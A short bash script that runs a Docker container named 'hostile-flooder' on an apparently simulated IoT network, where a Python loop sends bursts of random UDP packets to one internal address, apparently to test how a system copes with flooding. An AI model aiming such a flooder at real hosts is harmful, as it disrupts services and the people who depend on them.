#!/bin/bash
docker run -d \
  --name hostile-flooder \
  --network iot-sim-net \
  --ip 192.168.10.21 \
  python:3.11-slim \
  python -c "
import socket, time, os
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(512)
        for _ in range(500):
            s.sendto(payload, ('192.168.10.50', 5005))
        s.close()
    except Exception as e:
        print(f'Flood error: {e}')
    time.sleep(1)
"